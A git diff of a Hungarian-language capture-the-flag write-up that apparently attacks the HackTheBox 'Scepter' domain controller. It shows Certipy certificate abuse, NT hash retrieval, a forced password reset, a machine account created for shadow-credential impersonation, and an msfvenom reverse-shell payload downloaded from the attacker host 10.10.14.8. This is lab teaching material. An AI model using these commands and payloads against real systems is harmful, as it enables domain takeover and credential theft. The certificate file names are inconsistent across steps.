@@ -55,6 +55,8 @@ Service Info: Host: DC01; OS: Windows
 
 ```bash
 showmount -e 10.10.11.65
+Export list for 10.10.11.65:
+/helpdesk (everyone)
 mkdir /tmp/helpdesk
 sudo mount -t nfs 10.10.11.65:/helpdesk /tmp/helpdesk
 ls -l /tmp/helpdesk
@@ -89,6 +91,19 @@ sudo openssl pkcs12 -export -out baker.pfx -inkey baker.plain.key -in baker.crt
 
 ```bash
 certipy auth -pfx baker.pfx -username d.baker -dc-ip 10.10.11.65
+
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'd.baker@scepter.htb'
+[*]     Security Extension SID: 'S-1-5-21-74879546-916818434-740295365-1106'
+[*] Using principal: 'd.baker@scepter.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'd.baker.ccache'
+[*] Wrote credential cache to 'd.baker.ccache'
+[*] Trying to retrieve NT hash for 'd.baker'
+[*] Got hash for 'd.baker@scepter.htb': aad3b435b
 ```
 TGT szerzés, hash dump, `.ccache` export:
 ```bash
@@ -110,7 +125,15 @@ certipy req -u 'd.baker@scepter.htb' -dc-ip 10.10.11.65 -dc-host dc01.scepter.ht
 
 **Bloodhound futtatása:**
 ```bash
-sudo bloodhound-python    -u 'd.baker'    -d scepter.htb    -k -no-pass    -dc dc01.scepter.htb    -ns 10.10.11.65    --dns-tcp    --disable-autogc    -c all --zip
+sudo bloodhound-python \
+   -u 'd.baker' \
+   -d scepter.htb \
+   -k -no-pass \
+   -dc dc01.scepter.htb \
+   -ns 10.10.11.65 \
+   --dns-tcp \
+   --disable-autogc \
+   -c all --zip
 ```
 **Találat:**  
 - d.baker user tud **force change password-ot** végrehajtani a.carter-en.
@@ -118,6 +141,14 @@ sudo bloodhound-python    -u 'd.baker'    -d scepter.htb    -k -no-pass    -dc d
 ---
 
 ## Force Change Password - a.carter user
+
+## Certipy auth új NT hash és ccache
+
+```bash
+certipy auth -pfx d.baker.pfx -dc-ip 10.10.11.65
+export KRB5CCNAME=d.baker.ccache
+```
+## a.carter jelszó megváltoztatása rpcclientben
 
 ```bash
 pth-rpcclient -U 'SCEPTER\d.baker%aad3b4...:18b5fb...' 10.10.11.65 -c "setuserinfo2 a.carter 23 'NoSecHere!'"
@@ -147,6 +178,15 @@ Ha sikeres: jog rendben.
 
 ```bash
 certipy req -username "d.baker@scepter.htb" -hashes :18b5fb... -target "dc01.scepter.htb" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate'
+
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 7
+[*] Got certificate without identification
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'd.baker.pfx'
 ```
 
 ---
@@ -155,6 +195,16 @@ certipy req -username "d.baker@scepter.htb" -hashes :18b5fb... -target "dc01.sce
 
 ```bash
 certipy auth -pfx d.baker.pfx -domain scepter.htb -dc-ip 10.10.11.65 -username h.brown
+
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[!] Could not find identification in the provided certificate
+[*] Using principal: h.brown@scepter.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'h.brown.ccache'
+[*] Trying to retrieve NT hash for 'h.brown'
+[*] Got hash for 'h.brown@scepter.htb': aad3b435b5
 ```
 Hash: `aad3b4...:4ecf52...`
 
@@ -180,28 +230,108 @@ Hash: `aad3b4...:4ecf52...`
 ```
 
 ---
+## h.brown ccache fájl exportálása
+
+```bash
+export KRB5CCNAME=h.brown.ccache
+```
 
 ## evil-winrm h.brown userrel
 
 ```bash
-export KRB5CCNAME=h.brown.ccache
 evil-winrm -i dc01.scepter.htb -u h.brown
 ```
 
 **User flag pipa!**
 
 ---
+## Payload létrehozása
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=4444 -f exe -o dara.exe
+```
+## Letöltés a célgépem
+
+```bash
+Invoke-WebRequest -Uri "http://10.10.14.8/dara.exe" -OutFile "dara.exe"
+```
+
+## Msfconsole beállítása
+
+```bash
+msf6 > use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set lhost 10.10.14.8
+lhost => 10.10.14.8
+msf6 exploit(multi/handler) > set lport 4444
+lport => 4444
+```
 
 ## Privilege escalation – új gépfiók létrehozás, Shadow Credentials
 
 ```bash
 bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p 'NoSecHere!' --dc-ip 10.10.11.65 add computer nosecpc 'Password123'
+[+] nosecpc created
+```
+
+## Pontos CA és Template név csekkolása
+
+```bash
+certipy find -u 'nosecpc$' -p 'Password123' -target 10.10.11.65
+
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 35 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 13 enabled certificate templates
+[*] Trying to get CA configuration for 'scepter-DC01-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'scepter-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'scepter-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'scepter-DC01-CA'
+[-] Got error: module 'enum' has no attribute '_decompose'
+[-] Use -debug to print a stacktrace
 ```
 
 **Certipy find + req → géptanúsítvány beszerzés**
 
-**openssl x509 -in nosecpc.crt -noout -serial -issuer**
+```bash
+certipy req -ca scepter-DC01-CA -template Machine -target 10.10.11.65 -username 'nosecpc$' -password 'Password123'
 
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 9
+[*] Got certificate with DNS Host Name 'nosecpc.scepter.htb'
+[*] Certificate object SID is 'S-1-5-21-74879546-916818434-740295365-9101'
+[*] Saved certificate and private key to 'nosecpc.pfx'
+```
+
+## Cert szerzés
+
+```bash
+certipy cert -pfx meow.pfx -nokey -out nosecpc.crt
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Writing certificate and  to 'nosecpc.crt'
+```
+
+```bash
+**openssl x509 -in nosecpc.crt -noout -serial -issuer**
+serial=6200000009929668CFF0981AD8000000000009
+issuer=DC=htb, DC=scepter, CN=scepter-DC01-CA
+```
+
+## Átalakítjuk kettősponttal tagolt hex stringé
+
+```bash
+echo 6200000009929668CFF0981AD8000000000009 | sed 's/../&:/g;s/:$//'
+```
 ---
 
 ## X509 string generálás (Python)
@@ -238,7 +368,7 @@ X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>090000000000d81a98f0cf6896920900
 
 ---
 
-## PowerShell: altSecurityIdentities beállítása
+## PowerShell: altSecurityIdentities beállítása, $map változó definiálása 
 
 ```powershell
 $map = 'X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>090000000000d81a98f0cf6896920900000062'
@@ -250,7 +380,17 @@ Set-ADUser p.adams -Replace @{altSecurityIdentities=$map}
 ## Certipy auth p.adams-ként
 
 ```bash
-certipy auth -pfx meow.pfx -dc-ip 10.10.11.65 -username p.adams
+certipy auth -pfx nonamepc.pfx -dc-ip 10.10.11.65 -username p.adams
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[!] The provided username does not match the identification found in the provided certificate: 'P.ADAMS' - 'meow$'
+Do you want to continue? (Y/n) y
+[*] Using principal: p.adams@scepter.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'p.adams.ccache'
+[*] Trying to retrieve NT hash for 'p.adams'
+[*] Got hash for 'p.adams@scepter.htb': aad3b435b5
 ```
 Hash: `aad3b4...:1b925c...`
 
